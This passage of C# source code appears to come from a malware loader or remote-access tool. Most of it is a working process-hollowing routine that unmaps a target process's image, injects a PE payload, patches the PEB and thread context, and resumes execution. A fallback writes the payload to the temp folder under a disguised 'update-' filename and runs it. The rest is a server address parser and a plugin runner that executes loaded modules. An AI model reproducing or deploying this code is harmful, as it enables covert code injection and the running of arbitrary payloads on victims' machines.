                    Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)), out retLen);

                if (ntStatus != 0)
                {
                    TerminateProcess(hProcess, 1);
                    CloseHandle(hThread);
                    CloseHandle(hProcess);
                    ExecuteDropToDisk(fileBytes);
                    return;
                }

                int ibFieldOffset = processIs64 ? 0x10 : 0x08;
                int ibSize = processIs64 ? 8 : 4;
                IntPtr pebIbAddr = new IntPtr(pbi.PebBaseAddress.ToInt64() + ibFieldOffset);
                byte[] ibBytes = new byte[8];
                int br;

                if (!ReadProcessMemory(hProcess, pebIbAddr, ibBytes, ibSize, out br))
                {
                    TerminateProcess(hProcess, 1);
                    CloseHandle(hThread);
                    CloseHandle(hProcess);
                    ExecuteDropToDisk(fileBytes);
                    return;
                }

                if (processIs64)
                    originalImageBase = new IntPtr(BitConverter.ToInt64(ibBytes, 0));
                else
                    originalImageBase = new IntPtr((long)BitConverter.ToUInt32(ibBytes, 0));
            }

            NtUnmapViewOfSection(hProcess, originalImageBase);

            IntPtr preferredBase = new IntPtr(pe.ImageBase);
            IntPtr remoteBase = VirtualAllocEx(hProcess, preferredBase, pe.SizeOfImage,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            if (remoteBase == IntPtr.Zero)
            {
                remoteBase = VirtualAllocEx(hProcess, IntPtr.Zero, pe.SizeOfImage,
                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

                if (remoteBase == IntPtr.Zero)
                {
                    TerminateProcess(hProcess, 1);
                    CloseHandle(hThread);
                    CloseHandle(hProcess);
                    ExecuteDropToDisk(fileBytes);
                    return;
                }
            }

            long delta = remoteBase.ToInt64() - pe.ImageBase;
            byte[] mappedImage = BuildMappedImage(fileBytes, pe);

            if (delta != 0)
            {
                if (pe.HasRelocations && !pe.RelocsStripped)
                    ApplyRelocationsToBuffer(mappedImage, pe, delta);

                if (pe.Is64Bit)
                {
                    byte[] baseBytes = BitConverter.GetBytes(remoteBase.ToInt64());
                    Buffer.BlockCopy(baseBytes, 0, mappedImage, pe.OptionalHeaderOffset + 24, 8);
                }
                else
                {
                    byte[] baseBytes = BitConverter.GetBytes((int)remoteBase.ToInt64());
                    Buffer.BlockCopy(baseBytes, 0, mappedImage, pe.OptionalHeaderOffset + 28, 4);
                }
            }

            int bytesWritten;
            bool writeOk = WriteProcessMemory(hProcess, remoteBase, mappedImage,
                mappedImage.Length, out bytesWritten);

            if (!writeOk || bytesWritten != mappedImage.Length)
            {
                TerminateProcess(hProcess, 1);
                CloseHandle(hThread);
                CloseHandle(hProcess);
                ExecuteDropToDisk(fileBytes);
                return;
            }

            // Update PEB ImageBase
            if (targetIsWow64)
            {
                IntPtr peb32Addr = IntPtr.Zero;
                int retLen2;
                NtQueryInformationProcess_IntPtr(hProcess, 26, ref peb32Addr, IntPtr.Size, out retLen2);

                if (peb32Addr != IntPtr.Zero)
                {
                    IntPtr peb32IbAddr = new IntPtr(peb32Addr.ToInt64() + 0x08);
                    byte[] newBase32 = BitConverter.GetBytes((uint)remoteBase.ToInt64());
                    int bw;
                    WriteProcessMemory(hProcess, peb32IbAddr, newBase32, 4, out bw);
                }
            }
            else
            {
                var pbi2 = new PROCESS_BASIC_INFORMATION();
                int retLen2;
                NtQueryInformationProcess(hProcess, 0, ref pbi2,
                    Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)), out retLen2);

                int ibOffset = processIs64 ? 0x10 : 0x08;
                IntPtr pebIbAddr = new IntPtr(pbi2.PebBaseAddress.ToInt64() + ibOffset);

                byte[] newBaseBytes;
                if (processIs64)
                    newBaseBytes = BitConverter.GetBytes(remoteBase.ToInt64());
                else
                    newBaseBytes = BitConverter.GetBytes((int)remoteBase.ToInt64());

                int bw;
                WriteProcessMemory(hProcess, pebIbAddr, newBaseBytes, newBaseBytes.Length, out bw);
            }

            // Set thread context
            IntPtr entryPointVA = new IntPtr(remoteBase.ToInt64() + pe.AddressOfEntryPoint);

            if (targetIsWow64)
            {
                IntPtr ctxBuf = Marshal.AllocHGlobal(WOW64_CONTEXT_SIZE);

                try
                {
                    byte[] zeros = new byte[WOW64_CONTEXT_SIZE];
                    Marshal.Copy(zeros, 0, ctxBuf, WOW64_CONTEXT_SIZE);
                    Marshal.WriteInt32(ctxBuf, WOW64_CONTEXT_FLAGS_OFFSET,
                        unchecked((int)WOW64_CONTEXT_FULL));

                    if (!Wow64GetThreadContext(hThread, ctxBuf))
                    {
                        Marshal.Copy(zeros, 0, ctxBuf, WOW64_CONTEXT_SIZE);
                        Marshal.WriteInt32(ctxBuf, WOW64_CONTEXT_FLAGS_OFFSET,
                            unchecked((int)WOW64_CONTEXT_ALL));

                        if (!Wow64GetThreadContext(hThread, ctxBuf))
                        {
                            TerminateProcess(hProcess, 1);
                            CloseHandle(hThread);
                            CloseHandle(hProcess);
                            ExecuteDropToDisk(fileBytes);
                            return;
                        }
                    }

                    Marshal.WriteInt32(new IntPtr(ctxBuf.ToInt64() + WOW64_CONTEXT_EAX_OFFSET),
                        (int)entryPointVA.ToInt64());

                    if (!Wow64SetThreadContext(hThread, ctxBuf))
                    {
                        TerminateProcess(hProcess, 1);
                        CloseHandle(hThread);
                        CloseHandle(hProcess);
                        ExecuteDropToDisk(fileBytes);
                        return;
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(ctxBuf);
                }
            }
            else if (processIs64)
            {
                IntPtr ctxRaw = Marshal.AllocHGlobal(CONTEXT64_SIZE + 16);
                IntPtr ctx = new IntPtr((ctxRaw.ToInt64() + 15) & ~15L);

                try
                {
                    byte[] zeros = new byte[CONTEXT64_SIZE];
                    Marshal.Copy(zeros, 0, ctx, CONTEXT64_SIZE);
                    Marshal.WriteInt32(new IntPtr(ctx.ToInt64() + CONTEXT64_FLAGS_OFFSET),
                        unchecked((int)CONTEXT64_FULL));

                    if (!GetThreadContext(hThread, ctx))
                    {
                        TerminateProcess(hProcess, 1);
                        CloseHandle(hThread);
                        CloseHandle(hProcess);
                        ExecuteDropToDisk(fileBytes);
                        return;
                    }

                    Marshal.WriteInt64(new IntPtr(ctx.ToInt64() + CONTEXT64_RCX_OFFSET),
                        entryPointVA.ToInt64());

                    if (!SetThreadContext(hThread, ctx))
                    {
                        TerminateProcess(hProcess, 1);
                        CloseHandle(hThread);
                        CloseHandle(hProcess);
                        ExecuteDropToDisk(fileBytes);
                        return;
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(ctxRaw);
                }
            }
            else
            {
                IntPtr ctx = Marshal.AllocHGlobal(WOW64_CONTEXT_SIZE);

                try
                {
                    byte[] zeros = new byte[WOW64_CONTEXT_SIZE];
                    Marshal.Copy(zeros, 0, ctx, WOW64_CONTEXT_SIZE);
                    Marshal.WriteInt32(ctx, WOW64_CONTEXT_FLAGS_OFFSET,
                        unchecked((int)WOW64_CONTEXT_FULL));

                    if (!GetThreadContext(hThread, ctx))
                    {
                        TerminateProcess(hProcess, 1);
                        CloseHandle(hThread);
                        CloseHandle(hProcess);
                        ExecuteDropToDisk(fileBytes);
                        return;
                    }

                    Marshal.WriteInt32(new IntPtr(ctx.ToInt64() + WOW64_CONTEXT_EAX_OFFSET),
                        (int)entryPointVA.ToInt64());

                    if (!SetThreadContext(hThread, ctx))
                    {
                        TerminateProcess(hProcess, 1);
                        CloseHandle(hThread);
                        CloseHandle(hProcess);
                        ExecuteDropToDisk(fileBytes);
                        return;
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(ctx);
                }
            }

            ResumeThread(hThread);
            Log("[HOLLOW] Process hollowing successful! PID=" + targetPid);

            CloseHandle(hThread);
            hThread = IntPtr.Zero;
            CloseHandle(hProcess);
            hProcess = IntPtr.Zero;
        }
        catch (Exception ex)
        {
            Log("[HOLLOW] Fatal error: " + ex.GetType().Name + ": " + ex.Message);

            if (hProcess != IntPtr.Zero)
            {
                try { TerminateProcess(hProcess, 1); }
                catch { }
            }
            if (hThread != IntPtr.Zero)
            {
                try { CloseHandle(hThread); }
                catch { }
            }
            if (hProcess != IntPtr.Zero)
            {
                try { CloseHandle(hProcess); }
                catch { }
            }

            ExecuteDropToDisk(fileBytes);
        }
    }

    private static byte[] BuildMappedImage(byte[] fileBytes, PeInfo pe)
    {
        byte[] mapped = new byte[pe.SizeOfImage];

        int headerSize = (int)Math.Min(pe.SizeOfHeaders, (uint)fileBytes.Length);
        Buffer.BlockCopy(fileBytes, 0, mapped, 0, headerSize);

        int sectionOffset = pe.SectionHeadersOffset;
        for (int i = 0; i < pe.NumberOfSections; i++)
        {
            if (sectionOffset + 40 > fileBytes.Length) break;

            uint virtualSize = BitConverter.ToUInt32(fileBytes, sectionOffset + 8);
            uint virtualAddress = BitConverter.ToUInt32(fileBytes, sectionOffset + 12);
            uint rawDataSize = BitConverter.ToUInt32(fileBytes, sectionOffset + 16);
            uint rawDataOffset = BitConverter.ToUInt32(fileBytes, sectionOffset + 20);

            uint copySize = Math.Min(rawDataSize, virtualSize);
            if (rawDataSize == 0 || rawDataOffset == 0) copySize = 0;

            if (copySize > 0
                && rawDataOffset + copySize <= (uint)fileBytes.Length
                && virtualAddress + copySize <= (uint)mapped.Length)
            {
                Buffer.BlockCopy(fileBytes, (int)rawDataOffset, mapped,
                    (int)virtualAddress, (int)copySize);
            }

            sectionOffset += 40;
        }

        return mapped;
    }

    private static void ApplyRelocationsToBuffer(byte[] mapped, PeInfo pe, long delta)
    {
        if (pe.NumberOfDataDirectories <= IMAGE_DIRECTORY_ENTRY_BASERELOC) return;

        int relocDirOffset = pe.DataDirectoryOffset + (IMAGE_DIRECTORY_ENTRY_BASERELOC * 8);
        if (relocDirOffset + 8 > mapped.Length) return;

        uint relocRva = BitConverter.ToUInt32(mapped, relocDirOffset);
        uint relocSize = BitConverter.ToUInt32(mapped, relocDirOffset + 4);

        if (relocRva == 0 || relocSize == 0) return;

        int processed = 0;
        uint offset = 0;

        while (offset < relocSize)
        {
            int blockStart = (int)(relocRva + offset);
            if (blockStart + 8 > mapped.Length) break;

            uint pageRva = BitConverter.ToUInt32(mapped, blockStart);
            uint blockSize = BitConverter.ToUInt32(mapped, blockStart + 4);

            if (blockSize == 0 || blockSize < 8) break;

            int numEntries = (int)(blockSize - 8) / 2;

            for (int i = 0; i < numEntries; i++)
            {
                int entryIdx = blockStart + 8 + (i * 2);
                if (entryIdx + 2 > mapped.Length) break;

                ushort entry = BitConverter.ToUInt16(mapped, entryIdx);
                int type = entry >> 12;
                int entryOffset = entry & 0xFFF;

                int patchOffset = (int)(pageRva + entryOffset);

                switch (type)
                {
                    case IMAGE_REL_BASED_ABSOLUTE:
                        break;

                    case IMAGE_REL_BASED_HIGHLOW:
                        if (patchOffset + 4 <= mapped.Length)
                        {
                            int val = BitConverter.ToInt32(mapped, patchOffset);
                            val = (int)((long)val + delta);
                            byte[] patched = BitConverter.GetBytes(val);
                            Buffer.BlockCopy(patched, 0, mapped, patchOffset, 4);
                            processed++;
                        }
                        break;

                    case IMAGE_REL_BASED_DIR64:
                        if (patchOffset + 8 <= mapped.Length)
                        {
                            long val = BitConverter.ToInt64(mapped, patchOffset);
                            val += delta;
                            byte[] patched = BitConverter.GetBytes(val);
                            Buffer.BlockCopy(patched, 0, mapped, patchOffset, 8);
                            processed++;
                        }
                        break;
                }
            }

            offset += blockSize;
        }

        Log("[HOLLOW] Applied " + processed + " relocations to buffer.");
    }

    // ==================== Shared PE Utilities ====================

    private static uint GetSectionProtection(uint characteristics)
    {
        bool exec = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        bool read = (characteristics & IMAGE_SCN_MEM_READ) != 0;
        bool write = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;

        if (exec && write) return PAGE_EXECUTE_READWRITE;
        if (exec && read) return PAGE_EXECUTE_READ;
        if (exec) return PAGE_EXECUTE_READ;
        if (write) return PAGE_READWRITE;
        if (read) return PAGE_READONLY;
        return PAGE_NOACCESS;
    }

    private static uint AlignUp(uint value, uint alignment)
    {
        return (value + alignment - 1) & ~(alignment - 1);
    }

    // ==================== Drop-to-Disk Execution ====================

    private static void ExecuteDropToDisk(byte[] fileBytes)
    {
        if (fileBytes == null || fileBytes.Length == 0)
        {
            Log("[DROP-TO-DISK] No file data to write.");
            return;
        }

        string suffix = Guid.NewGuid().ToString().Substring(0, 8);
        string fileName;

        if (fileBytes.Length >= 2 && fileBytes[0] == 0x4D && fileBytes[1] == 0x5A)
            fileName = "update-" + suffix + ".exe";
        else if (fileBytes.Length >= 2 && fileBytes[0] == 0x50 && fileBytes[1] == 0x4B)
            fileName = "update-" + suffix + ".zip";
        else
            fileName = "update-" + suffix + ".bat";

        string filePath = Path.Combine(Path.GetTempPath(), fileName);
        try
        {
            File.WriteAllBytes(filePath, fileBytes);
            Log("[DROP-TO-DISK] Saved: " + filePath + " (" + fileBytes.Length + " bytes)");
            Process.Start(new ProcessStartInfo
            {
                FileName = filePath,
                UseShellExecute = true
            });
            Log("[DROP-TO-DISK] Executed successfully");
        }
        catch (Exception ex)
        {
            Log("[DROP-TO-DISK] Execute error: " + ex.Message);
        }
    }

    // ==================== Address Parser ====================

    private static Tuple<string, int> ParseServerAddress(string address)
    {
        string host = "";
        int port = 443;

        if (string.IsNullOrWhiteSpace(address))
            return Tuple.Create(host, port);

        string addr = address.Trim();

        if (addr.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
            addr = addr.Substring(8);
        else if (addr.StartsWith("http://", StringComparison.OrdinalIgnoreCase))
            addr = addr.Substring(7);

        int slashIdx = addr.IndexOf('/');
        if (slashIdx >= 0)
            addr = addr.Substring(0, slashIdx);

        addr = addr.Trim();

        if (addr.Contains(":"))
        {
            int lastColon = addr.LastIndexOf(':');
            host = addr.Substring(0, lastColon);
            string portStr = addr.Substring(lastColon + 1);
            int p;
            if (int.TryParse(portStr, out p) && p > 0 && p <= 65535)
                port = p;
        }
        else
        {
            host = addr;
        }

        return Tuple.Create(host, port);
    }
}

// ==================== Plugin Runner ====================

public class PluginRunner
{
    public ConcurrentQueue<byte[]> InQueue { get; private set; }
    public ConcurrentQueue<byte[]> OutQueue { get; private set; }
    public CancellationTokenSource Cts { get; private set; }
    public Thread WorkerThread { get; private set; }
    public Exception LastError { get; private set; }
    public volatile bool Running;

    public PluginRunner()
    {
        InQueue = new ConcurrentQueue<byte[]>();
        OutQueue = new ConcurrentQueue<byte[]>();
        Cts = new CancellationTokenSource();
    }

    public void Start(object pluginInstance)
    {
        Running = true;
        WorkerThread = new Thread(() =>
        {
            try
            {
                Func<byte[], Task> sendFunc = (data) =>
                {
                    OutQueue.Enqueue(data);
                    return Task.FromResult(0);
                };

                Func<Task<byte[]>> receiveFunc = () =>
                {
                    while (!Cts.IsCancellationRequested)
                    {
                        byte[] item;
                        if (InQueue.TryDequeue(out item))
                            return Task.FromResult(item);
                        Thread.Sleep(5);
                    }
                    return Task.FromResult<byte[]>(null);
                };

                MethodInfo runMethod = pluginInstance.GetType().GetMethod("Run");
                if (runMethod == null)
                {
                    LastError = new Exception("Plugin has no Run method");
                    return;
                }

                Task task = (Task)runMethod.Invoke(pluginInstance,
                    new object[] { sendFunc, receiveFunc });
                task.GetAwaiter().GetResult();
            }
            catch (Exception ex)
            {
                LastError = ex;
            }
            finally
            {
                Running = false;
            }
        });

        WorkerThread.IsBackground = true;
        WorkerThread.Name = "PluginWorker";
        WorkerThread.Start();
    }

    public void Stop()
    {
        try { Cts.Cancel(); }
        catch { }
        try
        {
            if (WorkerThread != null && WorkerThread.IsAlive)
                WorkerThread.Join(3000);
        }
        catch { }
        Running = false;
    }

    public int GetOutQueueCount()
    {
        return OutQueue.Count;
    }

    public void ClearOutQueue()
    {
        byte[] dummy;
        while (OutQueue.TryDequeue(out dummy)) { }
    }
}
